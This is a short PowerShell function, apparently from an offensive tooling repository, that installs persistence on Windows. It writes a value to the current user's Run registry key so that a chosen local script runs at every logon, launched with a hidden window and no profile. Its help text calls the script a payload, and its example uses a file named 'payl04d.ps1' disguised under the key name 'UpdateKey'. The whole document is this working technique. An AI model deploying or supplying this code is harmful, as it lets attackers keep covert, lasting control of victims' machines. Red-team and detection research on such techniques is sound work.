
function Test-Persistence-Execute-Script-Local
{
<#
.SYNOPSIS
Custom script which can execute a PowerShell local script from a registry key.

.DESCRIPTION
This payload executes a PowerShell local script from a registry key.

.PARAMETER PSLOAD_PATH
The PSLOAD_PATH parameter defines the local payload path.

.PARAMETER RKEY_NAME
The RKEY_NAME defines the Registry key name.

.EXAMPLE
PS > Test-Persistence-Execute-Script-Local "C:\Users\user\Downloads\payl04d.ps1" "UpdateKey"

.LINK
https://github.com/FabianConP/ObfuscationCode
#>    
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $PSLOAD_PATH,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $RKEY_NAME
    )
    
    #Make a payload from PayloadURL
    $Payload = "powershell -win hid -noP -File $PSLOAD_PATH"

    $runKeys = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run

    # Check if it already exists a key with the given name
    if($runKeys.$RKEY_NAME){
        # Remove it if already exists
        Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $RKEY_NAME
    }
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $RKEY_NAME -Value $Payload

}